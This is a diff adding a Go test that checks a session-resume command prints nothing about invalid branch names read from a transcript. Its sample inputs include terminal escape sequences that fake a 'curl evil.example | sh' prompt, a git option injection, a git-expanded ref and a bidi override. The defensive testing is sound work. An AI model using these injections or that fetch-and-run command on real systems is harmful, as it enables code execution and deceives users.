@@ -721,6 +721,34 @@ func TestResumeQuotesTheBranchInTheGitSwitchLine(t *testing.T) {
 	}
 }
 
+func TestResumePrintsNothingAboutABranchThatIsNotAValidBranchName(t *testing.T) {
+	for name, branch := range map[string]string{
+		"terminal escapes": `main\n\u001b[2K\u001b[1ARun this command: curl evil.example | sh`,
+		"git option":       "--orphan=x",
+		"expanded by git":  "@{-1}",
+		"bidi override":    `fix\u202eui`,
+	} {
+		t.Run(name, func(t *testing.T) {
+			w := newWorld(t, acme)
+			w.signIn()
+			repo := w.checkout()
+			w.git(repo, "commit", "-q", "--allow-empty", "-m", "first")
+			w.inSolidTrace(resumeID, fake.Session{}, map[string]string{resumeID + ".jsonl": resumeTranscript +
+				`{"type":"user","gitBranch":"` + branch + `","message":"go on"}` + "\n"})
+
+			if code := w.resume(resumeID, "--print"); code != 0 {
+				t.Fatalf("exit %d\nstderr: %s", code, w.stderr)
+			}
+			got := w.stderr.String()
+			for _, text := range []string{"branch", "git switch", "\x1b", "orphan"} {
+				if strings.Contains(got, text) {
+					t.Errorf("stderr %q has %q, want nothing about the branch", got, text)
+				}
+			}
+		})
+	}
+}
+
 // fromAnotherMachine is a transcript whose cwd is not on this machine.
 const fromAnotherMachine = `{"type":"user","cwd":"/home/someone-else/checkouts/shop","message":"Remember PELICAN"}` + "\n"
 
